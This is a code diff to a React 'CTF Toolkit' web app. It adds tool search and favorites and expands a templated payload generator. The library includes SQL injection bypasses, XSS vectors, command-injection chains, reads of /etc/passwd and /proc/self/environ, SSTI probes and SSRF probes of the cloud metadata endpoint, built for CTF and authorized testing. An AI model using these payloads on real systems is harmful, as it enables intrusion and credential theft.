@@ -37,11 +37,34 @@
             Fingerprint: (p) => Icon({ ...p, d: 'M2 12C2 6.5 6.5 2 12 2a10 10 0 0 1 8 4' }),
             Key: (p) => Icon({ ...p, d: 'M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4' })
         };
-        const { useState } = React;
+        const { useState, useEffect, useMemo } = React;
         const e = React.createElement;
         function CTFToolkit() {
             const [activeCategory, setActiveCategory] = useState('crypto');
             const [activeTool, setActiveTool] = useState('multi-codec');
+            const [toolQuery, setToolQuery] = useState('');
+            const [favorites, setFavorites] = useState(() => {
+                try { return JSON.parse(localStorage.getItem('cypher_favs') || '[]'); } catch(e) { return []; }
+            });
+            const [recent, setRecent] = useState(() => {
+                try { return JSON.parse(localStorage.getItem('cypher_recent') || '[]'); } catch(e) { return []; }
+            });
+
+            useEffect(() => { try { localStorage.setItem('cypher_favs', JSON.stringify(favorites)); } catch(e) {} }, [favorites]);
+            useEffect(() => { try { localStorage.setItem('cypher_recent', JSON.stringify(recent)); } catch(e) {} }, [recent]);
+
+            const selectTool = (id) => {
+                setActiveTool(id);
+                setRecent(prev => {
+                    const next = [id, ...prev.filter(x => x !== id)].slice(0, 8);
+                    return next;
+                });
+            };
+
+            const toggleFavorite = (id) => {
+                setFavorites(prev => prev.includes(id) ? prev.filter(x => x !== id) : [id, ...prev].slice(0, 24));
+            };
+
             const categories = [
                 { id: 'crypto', name: 'Cryptography', icon: 'Lock', color: '#00ff41' },
                 { id: 'web', name: 'Web Exploitation', icon: 'Globe', color: '#00d9ff' },
@@ -89,6 +112,30 @@
             };
             const currentCategory = categories.find(c => c.id === activeCategory);
             const currentTools = tools[activeCategory] || [];
+
+            const filteredTools = useMemo(() => {
+                const q = toolQuery.trim().toLowerCase();
+                const list = currentTools.slice();
+                // If query is empty, float favorites + recents to top
+                if (!q) {
+                    list.sort((a,b) => {
+                        const af = favorites.includes(a.id) ? 1 : 0;
+                        const bf = favorites.includes(b.id) ? 1 : 0;
+                        if (af !== bf) return bf - af;
+                        const ar = recent.includes(a.id) ? 1 : 0;
+                        const br = recent.includes(b.id) ? 1 : 0;
+                        if (ar !== br) return br - ar;
+                        return a.name.localeCompare(b.name);
+                    });
+                    return list;
+                }
+                return list.filter(t =>
+                    (t.name || '').toLowerCase().includes(q) ||
+                    (t.desc || '').toLowerCase().includes(q) ||
+                    (t.id || '').toLowerCase().includes(q)
+                );
+            }, [currentTools, toolQuery, favorites, recent]);
+
             return e('div', { className: 'min-h-screen bg-[#0a0e1a] text-[#e0e0e0] font-mono overflow-hidden' },
                 e('div', { className: 'fixed inset-0 opacity-20 pointer-events-none' },
                     e('div', { className: 'absolute inset-0', style: { backgroundImage: 'linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px)', backgroundSize: '50px 50px', animation: 'gridScroll 20s linear infinite' }})
@@ -148,15 +195,29 @@
                                     e('h2', { className: 'text-xl font-bold uppercase tracking-wider', style: { color: currentCategory.color }}, currentCategory.name),
                                     e('div', { className: 'h-px flex-1 bg-gradient-to-r from-transparent via-[#00ff41]/50 to-transparent' })
                                 ),
+                                e('div', { className: 'mb-3 flex gap-2 items-center' },
+                                    e('input', {
+                                        type: 'text',
+                                        value: toolQuery,
+                                        onChange: (ev) => setToolQuery(ev.target.value),
+                                        placeholder: 'Search tools… (name, desc, id)',
+                                        className: 'w-full px-3 py-2 rounded bg-[#0a0e1a]/70 border border-gray-700 text-sm text-gray-200 focus:border-[#00ff41] focus:outline-none'
+                                    }),
+                                    e('button', {
+                                        onClick: () => setToolQuery(''),
+                                        className: 'px-3 py-2 rounded bg-gray-800/60 border border-gray-700 text-xs font-bold hover:border-gray-500'
+                                    }, 'CLEAR')
+                                ),
                                 e('div', { className: 'grid grid-cols-2 gap-4' },
-                                    ...currentTools.map(tool => {
+                                    ...filteredTools.map(tool => {
                                         const isActive = activeTool === tool.id;
                                         return e('button', {
                                             key: tool.id,
-                                            onClick: () => setActiveTool(tool.id),
-                                            className: `tool-card text-left p-5 rounded-lg border transition-all ${isActive ? 'bg-gradient-to-br from-[#00ff41]/10 to-transparent border-[#00ff41]' : 'bg-[#0f1419]/80 border-gray-800 hover:border-gray-600'}`
+                                            onClick: () => selectTool(tool.id),
+                                            className: `tool-card relative text-left p-5 rounded-lg border transition-all ${isActive ? 'bg-gradient-to-br from-[#00ff41]/10 to-transparent border-[#00ff41]' : 'bg-[#0f1419]/80 border-gray-800 hover:border-gray-600'}`
                                         },
-                                            e('h3', { className: 'font-bold mb-2', style: { color: isActive ? currentCategory.color : '#e0e0e0' }}, tool.name),
+                                            e('button', { onClick: (ev) => { ev.stopPropagation(); toggleFavorite(tool.id); }, className: `absolute top-3 right-3 text-lg leading-none ${favorites.includes(tool.id) ? 'text-yellow-300' : 'text-gray-500'} hover:text-yellow-200` }, favorites.includes(tool.id) ? '★' : '☆'),
+                                            e('h3', { className: 'font-bold mb-2 pr-6', style: { color: isActive ? currentCategory.color : '#e0e0e0' }}, tool.name),
                                             e('p', { className: 'text-xs text-gray-400' }, tool.desc)
                                         );
                                     })
@@ -189,6 +250,13 @@
             const [jwtPayload, setJwtPayload] = useState('');
             const [jwtSig, setJwtSig] = useState('');
             const [payloadType, setPayloadType] = useState('sqli');
+            const [payloadQuery, setPayloadQuery] = useState('');
+            const [payloadEncoding, setPayloadEncoding] = useState('none');
+            const [payloadTarget, setPayloadTarget] = useState('https://target.local');
+            const [payloadParam, setPayloadParam] = useState('q');
+            const [payloadCmd, setPayloadCmd] = useState('id');
+            const [payloadIP, setPayloadIP] = useState('10.10.10.10');
+            const [payloadPort, setPayloadPort] = useState('4444');
             const [hexData, setHexData] = useState('');
             const [minLen, setMinLen] = useState(4);
             const [num, setNum] = useState('');
@@ -327,16 +395,205 @@ const caesarCipher = (text, s, d = false) => { const sh = d ? (26 - (s % 26)) : 
             }
 
             // PAYLOAD GENERATOR
-            if (tool === 'payload-gen') {
-                const payloads = { sqli: ["' OR '1'='1", "admin' --", "' UNION SELECT NULL--"], xss: ["<script>alert('XSS')<\/script>", "<img src=x onerror=alert(1)>"], cmdi: ["; ls", "| cat /etc/passwd", "&& whoami"] };
-                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Payload Generator'),
-                    e('div', { className: 'grid grid-cols-3 gap-2 mb-4' }, Object.keys(payloads).map(t => e('button', { key: t, onClick: () => setPayloadType(t), className: `px-4 py-2 rounded font-bold ${payloadType === t ? 'bg-[#00ff41]/20 border border-[#00ff41] text-[#00ff41]' : 'bg-gray-700/20 border border-gray-600 text-gray-400'}` }, t.toUpperCase()))),
-                    e('div', { className: 'bg-black/50 border border-gray-700 rounded p-4 max-h-96 overflow-y-auto' }, e('div', { className: 'space-y-2' }, ...payloads[payloadType].map((p, i) => e('div', { key: i, className: 'bg-[#0f1419] border border-gray-800 rounded p-3 hover:border-[#00ff41]/50 cursor-pointer', onClick: () => setInput(p) }, e('code', { className: 'text-xs text-gray-300' }, p))))),
-                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' })
-                );
-            }
+if (tool === 'payload-gen') {
+    // NOTE: This library is intended for authorized testing / CTF use. Avoid using against systems you don't own or have permission to test.
+    const encodeHtml = (s) => (s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+    const base64Encode = (s) => {
+        try {
+            const bytes = new TextEncoder().encode(s ?? '');
+            let binary = '';
+            for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
+            return btoa(binary);
+        } catch (e) { return ''; }
+    };
+    const applyEncoding = (s) => {
+        if (payloadEncoding === 'url') return encodeURIComponent(s);
+        if (payloadEncoding === 'html') return encodeHtml(s);
+        if (payloadEncoding === 'base64') return base64Encode(s);
+        return s;
+    };
+    const fill = (s) => (s ?? '')
+        .replace(/\{TARGET\}/g, payloadTarget)
+        .replace(/\{PARAM\}/g, payloadParam)
+        .replace(/\{CMD\}/g, payloadCmd)
+        .replace(/\{IP\}/g, payloadIP)
+        .replace(/\{PORT\}/g, payloadPort)
+        .replace(/\{DOMAIN\}/g, domain);
 
-            // URL PARSER
+    const library = {
+        sqli: [
+            { name: "Boolean auth bypass (single-quote)", payload: "' OR '1'='1' -- -", tags: "auth,boolean", notes: "Classic boolean-based bypass. May need adaptation to backend/quoting." },
+            { name: "Boolean auth bypass (double-quote)", payload: "\" OR \"1\"=\"1\" -- -", tags: "auth,boolean", notes: "Useful when input is wrapped in double quotes." },
+            { name: "Comment truncation", payload: "admin'-- -", tags: "auth,comment", notes: "Tries to comment out the rest of a query after username." },
+            { name: "UNION basic (3 cols, NULLs)", payload: "' UNION SELECT NULL,NULL,NULL -- -", tags: "union", notes: "Adjust NULL count to match column count." },
+            { name: "Time delay (MySQL)", payload: "' OR SLEEP(3) -- -", tags: "time", notes: "Simple time-based test (MySQL/MariaDB)." },
+            { name: "Time delay (PostgreSQL)", payload: "'; SELECT pg_sleep(3) --", tags: "time", notes: "Time-based test (PostgreSQL)." },
+            { name: "Order by probe", payload: "' ORDER BY 1 -- -", tags: "recon", notes: "Increment ORDER BY to infer column count." },
+            { name: "Error-based probe", payload: "' AND 1=CONVERT(int,(SELECT @@version)) --", tags: "error", notes: "May trigger visible errors (SQL Server)." }
+        ],
+        xss: [
+            { name: "Simple script tag", payload: "<script>alert(1)<\/script>", tags: "reflected", notes: "Works on permissive contexts. Escaped </script> is required inside script blocks." },
+            { name: "IMG onerror", payload: "<img src=x onerror=alert(1)>", tags: "reflected", notes: "Often works when <script> is filtered but attributes pass." },
+            { name: "SVG onload", payload: "<svg onload=alert(1)></svg>", tags: "reflected", notes: "Common alternative vector." },
+            { name: "Attribute break-out (double quote)", payload: "\"><img src=x onerror=alert(1)>", tags: "attr", notes: "Use when injection occurs inside an HTML attribute quoted with \". " },
+            { name: "HTML event handler", payload: "<button onclick=alert(1)>click</button>", tags: "dom", notes: "Basic event-handler test." }
+        ],
+        cmdi: [
+            { name: "Command chain (;) + whoami", payload: "; {CMD}", tags: "unix", notes: "Semicolon command chaining; replace {CMD}." },
+            { name: "Command chain (&&)", payload: "&& {CMD}", tags: "unix", notes: "Runs second command only if first succeeds." },
+            { name: "Pipe into command (|)", payload: "| {CMD}", tags: "unix", notes: "Pipes output to command; sometimes useful for bypassing." },
+            { name: "Windows chain (&)", payload: "& {CMD}", tags: "windows", notes: "Windows command separator." },
+            { name: "Windows chain (&&)", payload: "&& {CMD}", tags: "windows", notes: "Windows conditional chain." }
+        ],
+        lfi: [
+            { name: "Linux passwd", payload: "../../../../../etc/passwd", tags: "linux", notes: "Depth may vary; try adding/removing ../ segments." },
+            { name: "Linux proc self environ", payload: "../../../../../proc/self/environ", tags: "linux,proc", notes: "Sometimes reveals env vars / secrets." },
+            { name: "Windows hosts", payload: "..\..\..\Windows\System32\drivers\etc\hosts", tags: "windows", notes: "Backslashes for Windows paths." },
+            { name: "Traversal with URL-encoding (../)", payload: "..%2f..%2f..%2fetc%2fpasswd", tags: "encoding", notes: "Use when raw ../ is filtered." }
+        ],
+        ssti: [
+            { name: "Jinja2 basic expression", payload: "{{7*7}}", tags: "jinja2", notes: "If you see 49 rendered, template injection is likely." },
+            { name: "Handlebars basic", payload: "{{this}}", tags: "handlebars", notes: "Framework detection helper." },
+            { name: "ERB basic", payload: "<%= 7*7 %>", tags: "erb", notes: "Ruby ERB test." }
+        ],
+        ssrf: [
+            { name: "Localhost probe", payload: "http://127.0.0.1/", tags: "internal", notes: "Checks if server can reach localhost." },
+            { name: "Metadata (AWS)", payload: "http://169.254.169.254/latest/meta-data/", tags: "cloud", notes: "Cloud metadata endpoint probe (AWS). Use responsibly." },
+            { name: "Targeted internal host", payload: "http://{IP}:{PORT}/", tags: "internal", notes: "Use placeholders for internal IP/port." }
+        ],
+        traversal: [
+            { name: "Path traversal in parameter", payload: "{TARGET}?{PARAM}=../../../../etc/passwd", tags: "web", notes: "Template shows how traversal looks when used in a URL param." },
+            { name: "Windows traversal in parameter", payload: "{TARGET}?{PARAM}=..\..\..\Windows\win.ini", tags: "web,windows", notes: "Common Windows file test." }
+        ],
+        redirect: [
+            { name: "Open redirect (basic)", payload: "{TARGET}?next=https://{DOMAIN}/", tags: "web", notes: "Adjust parameter name to match app (next/url/redirect/return)." },
+            { name: "Protocol-relative redirect", payload: "{TARGET}?next=//{DOMAIN}/", tags: "web", notes: "Sometimes bypasses filters that block http(s)://." }
+        ],
+        jwt: [
+            { name: "Header/payload placeholder", payload: "HEADER.{PAYLOAD}.SIGNATURE", tags: "tokens", notes: "Use JWT tool to decode/edit/encode. Placeholder entry for workflows." }
+        ]
+    };
+
+    const types = Object.keys(library);
+    const q = payloadQuery.trim().toLowerCase();
+    const entries = (library[payloadType] || []).filter(x => {
+        if (!q) return true;
+        const blob = `${x.name} ${x.payload} ${x.tags} ${x.notes}`.toLowerCase();
+        return blob.includes(q);
+    });
+
+    const onSelect = (tpl) => {
+        const rendered = fill(tpl.payload);
+        const finalPayload = applyEncoding(rendered);
+        setInput(finalPayload);
+    };
+
+    const pill = (active) => `px-3 py-2 rounded font-bold text-xs ${active ? 'bg-[#00ff41]/20 border border-[#00ff41] text-[#00ff41]' : 'bg-gray-700/20 border border-gray-600 text-gray-400 hover:border-[#00ff41]/40'}`;
+
+    return e('div', { className: 'space-y-4' },
+        e('div', { className: 'flex items-center justify-between gap-2' },
+            e('h3', { className: 'text-lg font-bold', style: { color } }, 'Payload Generator (Elite)'),
+            e('button', { onClick: () => copyToClipboard(input), className: 'px-3 py-2 bg-[#00ff41]/20 border border-[#00ff41] rounded text-xs font-bold text-[#00ff41] hover:bg-[#00ff41]/30' }, 'COPY')
+        ),
+
+        e('div', { className: 'grid grid-cols-1 lg:grid-cols-3 gap-3' },
+            // LEFT: Types
+            e('div', { className: 'bg-black/30 border border-gray-700 rounded p-3 space-y-2' },
+                e('div', { className: 'text-xs text-gray-400 mb-2' }, 'Payload Type'),
+                e('div', { className: 'grid grid-cols-2 gap-2' },
+                    ...types.map(t => e('button', { key: t, onClick: () => setPayloadType(t), className: pill(payloadType === t) }, t.toUpperCase()))
+                ),
+                e('div', { className: 'mt-2 text-[11px] text-gray-500 leading-snug' },
+                    'Templates support: {TARGET}, {PARAM}, {CMD}, {IP}, {PORT}, {DOMAIN}.'
+                )
+            ),
+
+            // MIDDLE: Controls
+            e('div', { className: 'bg-black/30 border border-gray-700 rounded p-3 space-y-3' },
+                e('div', { className: 'text-xs text-gray-400' }, 'Search / Encode'),
+                e('input', {
+                    type: 'text',
+                    value: payloadQuery,
+                    onChange: (ev) => setPayloadQuery(ev.target.value),
+                    placeholder: 'Search (e.g., union, time, windows, meta-data)...',
+                    className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-sm font-mono focus:border-[#00ff41] focus:outline-none'
+                }),
+                e('div', { className: 'grid grid-cols-2 gap-2' },
+                    e('select', {
+                        value: payloadEncoding,
+                        onChange: (ev) => setPayloadEncoding(ev.target.value),
+                        className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none'
+                    },
+                        e('option', { value: 'none' }, 'No encoding'),
+                        e('option', { value: 'url' }, 'URL encode'),
+                        e('option', { value: 'html' }, 'HTML entities'),
+                        e('option', { value: 'base64' }, 'Base64')
+                    ),
+                    e('button', {
+                        onClick: () => { setPayloadQuery(''); setPayloadEncoding('none'); },
+                        className: 'px-3 py-2 bg-gray-700/20 border border-gray-600 rounded text-xs font-bold text-gray-300 hover:border-[#00ff41]/40'
+                    }, 'RESET')
+                ),
+                e('div', { className: 'text-xs text-gray-400 pt-1' }, 'Template values'),
+                e('div', { className: 'grid grid-cols-2 gap-2' },
+                    e('input', { value: payloadTarget, onChange: (ev) => setPayloadTarget(ev.target.value), placeholder: '{TARGET}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
+                    e('input', { value: payloadParam, onChange: (ev) => setPayloadParam(ev.target.value), placeholder: '{PARAM}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
+                    e('input', { value: payloadCmd, onChange: (ev) => setPayloadCmd(ev.target.value), placeholder: '{CMD}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
+                    e('div', { className: 'grid grid-cols-2 gap-2' },
+                        e('input', { value: payloadIP, onChange: (ev) => setPayloadIP(ev.target.value), placeholder: '{IP}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' }),
+                        e('input', { value: payloadPort, onChange: (ev) => setPayloadPort(ev.target.value), placeholder: '{PORT}', className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-xs font-mono focus:border-[#00ff41] focus:outline-none' })
+                    )
+                )
+            ),
+
+            // RIGHT: Library
+            e('div', { className: 'bg-black/30 border border-gray-700 rounded p-3 space-y-2' },
+                e('div', { className: 'flex items-center justify-between' },
+                    e('div', { className: 'text-xs text-gray-400' }, `Library (${entries.length})`),
+                    e('div', { className: 'text-[11px] text-gray-500' }, payloadType.toUpperCase())
+                ),
+                e('div', { className: 'bg-black/50 border border-gray-800 rounded p-2 max-h-80 overflow-y-auto space-y-2' },
+                    ...entries.map((tpl, i) => e('div', {
+                        key: i,
+                        className: 'bg-[#0f1419] border border-gray-800 rounded p-3 hover:border-[#00ff41]/50 cursor-pointer'
+                    },
+                        e('div', { className: 'flex items-start justify-between gap-2' },
+                            e('div', { className: 'space-y-1' },
+                                e('div', { className: 'text-xs font-bold text-gray-200' }, tpl.name),
+                                e('code', { className: 'block text-[11px] text-gray-300 break-words' }, fill(tpl.payload)),
+                                e('div', { className: 'text-[10px] text-gray-500 leading-snug' }, tpl.notes)
+                            ),
+                            e('button', {
+                                onClick: (ev) => { ev.stopPropagation(); onSelect(tpl); },
+                                className: 'px-2 py-1 bg-[#00ff41]/20 border border-[#00ff41] rounded text-[10px] font-bold text-[#00ff41] hover:bg-[#00ff41]/30'
+                            }, 'USE')
+                        )
+                    ))
+                )
+            )
+        ),
+
+        e('div', { className: 'grid grid-cols-1 lg:grid-cols-2 gap-3' },
+            e('div', { className: 'space-y-1' },
+                e('div', { className: 'text-xs text-gray-400' }, 'Selected / Custom Payload'),
+                e('textarea', {
+                    value: input,
+                    onChange: (ev) => setInput(ev.target.value),
+                    className: 'w-full h-28 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none'
+                })
+            ),
+            e('div', { className: 'space-y-1' },
+                e('div', { className: 'text-xs text-gray-400' }, 'Quick actions'),
+                e('div', { className: 'grid grid-cols-2 gap-2' },
+                    e('button', { onClick: () => setInput(''), className: 'px-3 py-2 bg-gray-700/20 border border-gray-600 rounded text-xs font-bold text-gray-300 hover:border-[#00ff41]/40' }, 'CLEAR'),
+                    e('button', { onClick: () => setInput(applyEncoding(fill(input))), className: 'px-3 py-2 bg-[#00ff41]/20 border border-[#00ff41] rounded text-xs font-bold text-[#00ff41] hover:bg-[#00ff41]/30' }, 'APPLY TEMPLATE+ENC')
+                )
+            )
+        )
+    );
+}
+
+// URL PARSER
             if (tool === 'url-parser') {
                 const parseURL = () => { try { const url = new URL(input); const params = {}; url.searchParams.forEach((v, k) => { params[k] = v; }); setOutput(JSON.stringify({ protocol: url.protocol, hostname: url.hostname, port: url.port || '(default)', pathname: url.pathname, params: params, hash: url.hash }, null, 2)); } catch(e) { setOutput('Error'); }};
                 return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'URL Parser'),
